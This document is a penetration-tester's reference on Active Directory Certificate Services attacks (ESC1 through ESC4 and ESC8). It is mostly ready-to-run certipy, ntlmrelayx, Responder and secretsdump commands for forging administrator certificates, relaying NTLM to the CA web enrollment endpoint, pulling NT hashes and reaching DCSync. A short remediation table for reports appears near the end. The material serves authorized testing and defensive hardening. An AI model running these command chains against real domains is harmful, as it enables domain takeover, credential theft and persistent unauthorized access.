# ADCS Attacks — Active Directory Certificate Services

---

## What Is ADCS and Why Does It Matter?

**Active Directory Certificate Services** is Microsoft's PKI (Public Key Infrastructure) built into Windows domains. It issues **digital certificates** — cryptographic ID cards that prove who you are.

In an AD environment, certificates are used for:
- User/computer authentication (log in with a cert instead of a password)
- Smart card login
- Encrypting email, signing code
- VPN authentication

**Why attackers love it:** A certificate that lets you authenticate as a user does not expire when the user changes their password. If you get a cert for Domain Admin, you can authenticate as DA even after the password rotates — and the cert might be valid for a year.

---

## Key Concepts

### Certificate Templates
Templates define the rules for certificates: who can request one, what it is valid for, how long it lasts.

### Enrollment
"Enrollment" = requesting a certificate.

### Subject Alternative Name (SAN)
A SAN is an extra field in a certificate that says "this cert is also valid for this other identity." If a template lets you specify your own SAN, you can request a cert that says you are anyone in the domain — including Domain Admin.

### Finding the Enterprise CA
```sh
# From Linux
certipy find -u user@corp.local -p pass -dc-ip <DC-IP>
```

---

## Finding Vulnerable Templates (Always Do This Step)

```sh
# Certipy — enumerate all templates and flag vulnerable ones
certipy find -u user@corp.local -p pass -dc-ip <DC-IP> -vulnerable -stdout

# With hash instead of password
certipy find -u user@corp.local -hashes :<NT-hash> -dc-ip <DC-IP> -vulnerable -stdout
```

Certipy outputs a summary of each vulnerable template with the ESC number. That tells you exactly which attack applies.

---

## Privileges Required (per ESC)

| Step | Privilege | Why |
|---|---|---|
| **Enumerate templates** (`certipy find`) | **Any authenticated domain user** | LDAP read on the Configuration NC is granted to all authed users |
| **ESC1** (SAN abuse) | Enrollment rights on the vulnerable template (often granted to broad groups like Domain Users) | The misconfig (`ENROLLEE_SUPPLIES_SUBJECT` + low-priv enrollment) IS the privesc |
| **ESC2** (any-purpose EKU) | Enrollment rights on the template | Same low-priv enrollment idea — cert's EKU lets you use it for any purpose |
| **ESC3** (Enrollment Agent abuse) | Enrollment rights on the Enrollment Agent template | EA cert grants "request on behalf of" any user |
| **ESC4** (template ACL abuse) | **Write permission** on a certificate template (often via group nesting / forgotten ACLs) | You don't exploit a misconfig — you *create one* by writing a vulnerable EKU/flag to the template |
| **ESC8** (NTLM relay → web enrollment) | **A position to coerce + relay** — your account can be unprivileged | The relayed identity is a *machine account* (often the DC) coerced via PetitPotam/PrinterBug |
| **Request the cert** (`certipy req`) | Whatever the template requires (rows above) | Normal AD enrollment activity |
| **Authenticate with the cert** (`certipy auth`) | **None** | Cert *is* the credential — returns a TGT + NTLM hash |

**Get there:** ADCS is unusually generous — most ESCs work from **any authenticated domain user** as long as the template misconfig already exists. The privesc lives in the template, not your account. Always run `certipy find -vulnerable` early. For ESC8 specifically, you need a [relay position](../initial-access/smb-relay.md) (Responder + ntlmrelayx on the network) and a coercion primitive (PetitPotam, PrinterBug — covered in the relay note). For ESC4 you need write rights on a template, which often comes from [ACL Abuse](acl-abuse.md) paths visible in [BloodHound](../enumeration/bloodhound.md).

---

## ESC1 — Enrollee Supplies Subject (SAN Abuse)

### Why It's Vulnerable
The template has **"Enrollee Supplies Subject"** enabled — you can put **any name you want** in the SAN when requesting a cert.

### The Attack

**Step 1 — Request a cert as Domain Admin**
```sh
certipy req -u user@corp.local -p pass -dc-ip <DC-IP> \
  -ca CORP-CA \
  -template VulnerableTemplate \
  -upn administrator@corp.local

# Output: administrator.pfx
```

**Step 2 — Use the cert to get a TGT**
```sh
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```

Output:
```
[*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
```

You now have the NT hash for Administrator:
```sh
nxc smb <DC-IP> -u administrator -H fc525c9683e8fe067095ba2ddc971889
secretsdump.py corp.local/administrator@<DC-IP> -hashes :fc525c9683e8fe067095ba2ddc971889
```

---

## ESC2 — Any Purpose / No EKU

### Why It's Vulnerable
The template has **no Extended Key Usage** set, or has the **"Any Purpose"** EKU. With no restriction, the cert can be used for anything — including client authentication.

### The Attack
Same flow as ESC1 — request with `-upn administrator@corp.local`, authenticate with the cert.

```sh
certipy req -u user@corp.local -p pass -dc-ip <DC-IP> \
  -ca CORP-CA \
  -template VulnerableTemplate \
  -upn administrator@corp.local

certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```

---

## ESC3 — Enrollment Agent Abuse

### Why It's Vulnerable
Two-step attack using a Certificate Request Agent template to request certs on behalf of other users.

### The Attack

**Step 1 — Get an enrollment agent certificate**
```sh
certipy req -u user@corp.local -p pass -dc-ip <DC-IP> \
  -ca CORP-CA \
  -template EnrollmentAgentTemplate
# Output: user.pfx (enrollment agent cert)
```

**Step 2 — Use the agent cert to request a cert ON BEHALF OF Domain Admin**
```sh
certipy req -u user@corp.local -p pass -dc-ip <DC-IP> \
  -ca CORP-CA \
  -template UserTemplate \
  -on-behalf-of corp\\administrator \
  -pfx user.pfx
# Output: administrator.pfx
```

**Step 3 — Authenticate**
```sh
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```

---

## ESC4 — Vulnerable Template Access Control (Write Permissions)

### Why It's Vulnerable
Your low-priv user has **write permissions on the template itself** — you can modify the template to be vulnerable to ESC1.

### The Attack

**Step 1 — Modify the template**
```sh
certipy template -u user@corp.local -p pass -dc-ip <DC-IP> \
  -template VulnerableTemplate \
  -save-old    # saves original settings so you can restore after
```

**Step 2 — Request a cert as DA (now ESC1 applies)**
```sh
certipy req -u user@corp.local -p pass -dc-ip <DC-IP> \
  -ca CORP-CA \
  -template VulnerableTemplate \
  -upn administrator@corp.local
```

**Step 3 — Restore the original template (clean up)**
```sh
certipy template -u user@corp.local -p pass -dc-ip <DC-IP> \
  -template VulnerableTemplate \
  -configuration VulnerableTemplate.json
```

**Step 4 — Authenticate**
```sh
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```

---

## ESC8 — NTLM Relay to AD CS HTTP Endpoint

The CA's web enrollment interface (`http://<CA>/certsrv/`) accepts NTLM authentication over HTTP. If you can relay NTLM authentication to this endpoint, you can request a certificate as the relayed user — including Domain Controllers, which gives you DCSync rights.

```sh
# Terminal 1 — relay to the CA web enrollment
ntlmrelayx.py -t http://<CA-IP>/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController

# Terminal 2 — Responder or mitm6 to capture auth
sudo responder -I eth0 -dPv

# When a DC authenticates → you get a .pfx
# Then:
certipy auth -pfx dc01.pfx -dc-ip <DC-IP>
# → DC machine account hash → DCSync
```

---

## Full Attack Flow Summary

```
certipy find → identify ESC number
    ↓
ESC1/2: certipy req -upn administrator → administrator.pfx
ESC3:   req agent cert → req on-behalf-of DA → administrator.pfx
ESC4:   modify template → ESC1 attack → restore template
    ↓
certipy auth -pfx administrator.pfx
    → NT hash for administrator
    ↓
nxc / secretsdump / evil-winrm with hash
    → Domain Admin shell / DCSync
```

---

## When to Check for ADCS

- Any time you get domain credentials
- Run `certipy find -vulnerable` immediately after BloodHound collection
- Takes 10 seconds to check — worth running on every AD engagement

---

## Certipy Quick Reference

```sh
# Enumerate (always run this)
certipy find -u user@corp.local -p pass -dc-ip <DC-IP> -vulnerable -stdout

# Request a cert (ESC1/2)
certipy req -u user@corp.local -p pass -dc-ip <DC-IP> -ca <CA-NAME> -template <TEMPLATE> -upn administrator@corp.local

# Authenticate with cert → get NT hash
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>

# If PKINIT fails (old DC or no Kerberos cert support) — use LDAP instead
certipy auth -pfx administrator.pfx -dc-ip <DC-IP> -ldap-shell

# With hash auth
certipy find -u user@corp.local -hashes :<NT-hash> -dc-ip <DC-IP> -vulnerable
```

---

## Remediation (For Report Writing)

**Root cause:** Certificate templates are complex to configure correctly. Custom templates created for specific use cases are frequently misconfigured — especially the "Enrollee Supplies Subject" setting.

| Finding | Remediation |
|---|---|
| ESC1 — Enrollee supplies subject | Disable **"Supply in the request"** in the template's Subject Name tab. Instead set it to "Build from Active Directory information." |
| ESC2 — No EKU or Any Purpose | Set specific EKUs appropriate for the template's purpose. Remove the "Any Purpose" EKU. |
| ESC3 — Enrollment agent template | Restrict who can enroll in the Certificate Request Agent template. Enable **CA Manager Approval** to require manual sign-off. |
| ESC4 — Write permissions on template | Only Domain Admins / CA admins should have write access to templates. |
| ESC8 — Web enrollment NTLM relay | Disable **NTLM authentication** on the CA web enrollment endpoint. Enforce HTTPS + Extended Protection for Authentication (EPA). |
| General ADCS hardening | Run **certipy find** as a regular audit tool. Enable **CA Audit logging** (certutil -setreg CA\AuditFilter 127). Review Event ID 4886 logs for anomalous requests. |

**Key point for reports:** ADCS vulnerabilities are particularly impactful because certificates persist beyond password changes — a cert valid for 1 year gives an attacker 1 year of persistent access regardless of remediation. Always recommend revoking any suspect certificates immediately.

---

## Why certipy auth Gives You a Hash

When you authenticate with a certificate, Certipy uses **PKINIT** — a Kerberos extension that lets you log in with a cert instead of a password. The DC returns a TGT. Certipy then uses a technique called **UnPAC-the-hash** to extract the NT hash from the TGT's PAC structure. This is why you get a usable NT hash at the end — not just a Kerberos ticket.
